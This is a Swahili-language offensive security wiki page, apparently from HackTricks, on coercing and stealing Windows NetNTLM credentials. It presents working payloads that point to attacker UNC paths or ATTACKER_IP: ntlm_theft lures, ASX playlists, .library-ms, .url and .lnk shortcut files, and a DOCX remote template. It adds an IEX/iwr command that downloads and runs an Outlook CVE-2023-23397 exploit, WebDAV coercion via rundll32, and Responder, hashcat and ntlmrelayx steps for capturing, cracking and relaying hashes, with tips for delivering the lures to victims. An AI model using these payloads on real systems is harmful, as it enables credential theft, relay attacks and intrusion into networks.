# Maeneo ya kuiba NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) kuanzia kupakua microsoft word file mtandaoni hadi chanzo cha ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ikiwa unaweza **kuandika kwenye share ambayo watumiaji au scheduled jobs huvinjari katika Explorer**, weka files ambazo metadata yake inaelekeza kwenye UNC yako, kwa mfano `\\ATTACKER\share`. Ku-render folder husababisha **implicit SMB authentication** na kuvuja kwa **NetNTLMv2** kwenye listener wako.<sup>[[1]](#references)</sup>

1. **Generate lures** (inashughulikia SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Waweke kwenye share inayoweza kuandikwa** (folda yoyote ambayo mwathiriwa hufungua):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Sikiliza na crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows inaweza kufikia faili kadhaa kwa wakati mmoja; chochote ambacho Explorer huonyesha preview (`BROWSE TO FOLDER`) hakihitaji kubofya.

### Windows Media Player playlists (.ASX/.WAX)

Ikiwa unaweza kumshawishi target afungue au aonyeshe preview ya playlist ya Windows Media Player unayodhibiti, unaweza ku-leak Net‑NTLMv2 kwa kuelekeza entry kwenye UNC path. WMP itajaribu kuchukua media iliyorejelewa kupitia SMB na ita-authenticate implicitly.<sup>[[3]](#references)[[4]](#references)</sup>

Mfano wa payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na uvunjaji:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hushughulikia kwa njia isiyo salama faili za .library-ms zinapofunguliwa moja kwa moja kutoka ndani ya ZIP archive. Ikiwa library definition inaelekeza kwenye UNC path ya mbali (mfano, \\attacker\share), kuvinjari/kuzindua tu .library-ms ndani ya ZIP husababisha Explorer kuhesabu UNC na kutuma NTLM authentication kwa attacker. Hii hutoa NetNTLMv2 ambayo inaweza ku-crackiwa offline au, huenda, ku-relay-iwa.<sup>[[2]](#references)</sup>

Minimal .library-ms inayoelekeza kwenye attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Hatua za utekelezaji
- Unda faili la `.library-ms` lenye XML iliyo hapo juu (weka IP/hostname yako).
- Lifunge katika ZIP (kwenye Windows: Send to → Compressed (zipped) folder) na upeleke ZIP kwa target.
- Endesha NTLM capture listener na usubiri mwathiriwa afungue `.library-ms` kutoka ndani ya ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows ilichakata extended MAPI property `PidLidReminderFileParameter` katika calendar items. Ikiwa property hiyo ilielekeza kwenye UNC path (kwa mfano, `\\attacker\share\alert.wav`), Outlook ingeunganishwa na SMB share wakati reminder ilipoanzishwa, na kuvuja Net-NTLMv2 ya mtumiaji bila kubofya chochote. Hili lilirekebishwa tarehe 14 Machi 2023, lakini bado lina umuhimu mkubwa kwa legacy/untouched fleets na kwa historical incident response.<sup>[[5]](#references)</sup>

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa msikilizaji:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Vidokezo
- Victim anahitaji tu Outlook for Windows iwe inaendelea kufanya kazi reminder inapo-trigger.
- leak hutoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass ya CVE‑2025‑24054)

Windows Explorer hu-render shortcut icons kiotomatiki. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya Microsoft kutoa patch ya Aprili 2025 kwa UNC-icon shortcuts, bado iliwezekana ku-trigger NTLM authentication bila kubofya chochote kwa ku-host shortcut target kwenye UNC path na kuweka icon ikiwa local (patch bypass ilipewa CVE‑2025‑50154). Kuangalia tu folder husababisha Explorer kuretrieve metadata kutoka kwenye remote target, na kutuma NTLM kwa attacker SMB server.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Mawazo ya delivery
- Weka shortcut ndani ya ZIP na umfanye victim aifungue.
- Weka shortcut kwenye share inayoweza kuandikwa ambayo victim ataifungua.
- Ichanganye na lure files nyingine kwenye folder hiyo hiyo ili Explorer ionyeshe preview ya vitu hivyo.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows hupakia metadata ya `.lnk` wakati wa **view/preview** (uchoraji wa icon), si wakati wa execution pekee. CVE‑2026‑25185 inaonyesha parsing path ambapo block za **ExtraData** husababisha shell kutatua icon path na kugusa filesystem **wakati wa load**, hivyo kutoa outbound NTLM wakati path ni ya remote.

Masharti muhimu ya trigger (yaliyoonekana kwenye `CShellLink::_LoadFromStream`):
- Jumuisha **DARWIN_PROPS** (`0xa0000006`) ndani ya ExtraData (gate ya icon update routine).
- Jumuisha **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) yenye `TargetUnicode` iliyo populated.
- Loader hupanua environment variables ndani ya `TargetUnicode` na kuita `PathFileExistsW` kwenye path inayotokana.

Ikiwa `TargetUnicode` itatatuliwa kuwa UNC path (kwa mfano, `\\attacker\share\icon.ico`), **kutazama tu folder** yenye shortcut husababisha outbound authentication. Load path hiyo hiyo inaweza pia kufikiwa na **indexing** na **AV scanning**, na kuifanya iwe leak surface ya vitendo isiyohitaji click.<sup>[[7]](#references)</sup>

Research tooling (parser/generator/UI) inapatikana kwenye project ya **LnkMeMaybe** kwa ajili ya kuunda/kukagua miundo hii bila kutumia Windows GUI.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

**WebDAV client** ya native inaweza kutumiwa kulazimisha current logon session ku-authenticate kwenye **HTTP/WebDAV** endpoint yoyote:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Kwa nini hii ni muhimu:
- Dhidi ya **attacker-controlled WebDAV server**, inaweza kusababisha **NTLM over HTTP** bila kuhitaji kuacha custom client.
- Dhidi ya **internal hosts**, ni njia tulivu ya **validate credentials zilizoibiwa zinakubaliwa wapi** kabla ya kuendelea na lateral movement.<sup>[[9]](#references)</sup>
- Command hii ni mbadala mzuri wakati **SMB egress imechujwa**, lakini **HTTP/WebDAV** bado inapatikana.

Maelezo ya uendeshaji:
- Service ya **WebClient** lazima iwe inaendeshwa kwenye source host.
- `rundll32.exe` hupakia `davclnt.dll` na kufanya Windows ishughulikie WebDAV authentication kwa kutumia **credentials za current user**.<sup>[[10]](#references)</sup>
- Ukiielekeza kwenye infrastructure unayodhibiti, tumia NTLM-aware HTTP listener/relay kama vile:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Kwa mtazamo wa detection, utekelezaji unaorudiwa wa `rundll32.exe davclnt.dll,DavSetCookie` dhidi ya mifumo mingi ya ndani ni ishara thabiti ya **credential validation / maandalizi ya lateral movement yanayofanana na spray** badala ya tabia ya kawaida ya mtumiaji.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection ili kulazimisha NTLM

Office documents zinaweza kurejelea template ya nje. Ukiweka template iliyoambatishwa kuwa UNC path, kufungua document kutafanya authentication kwa SMB.

Mabadiliko madogo ya DOCX relationship (ndani ya word/):

1) Hariri word/settings.xml na uongeze reference ya template iliyoambatishwa:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwenye UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Pakia upya katika .docx na uwasilishe. Endesha SMB capture listener yako na usubiri kufunguliwa.

Kwa mawazo ya post-capture kuhusu relaying au kutumia vibaya NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## Marejeo
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
